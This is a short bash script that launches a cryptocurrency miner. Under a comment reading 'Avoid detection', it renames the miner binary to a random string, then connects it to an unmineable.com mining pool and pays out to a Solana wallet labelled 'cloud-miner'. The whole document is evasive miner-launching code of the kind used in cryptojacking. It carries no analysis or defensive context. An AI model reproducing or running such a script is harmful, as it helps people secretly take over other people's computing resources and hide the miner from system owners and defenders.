#!/bin/bash

# Avoid detection
RANDOM_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13)
mv miner $RANDOM_NAME
./$RANDOM_NAME -o rx.unmineable.com:3333 -u SOL:BrRNyvr6TJfhqFewqWenyuC4VrfFAZXJoiPBkLbc8eRk.cloud-miner -k
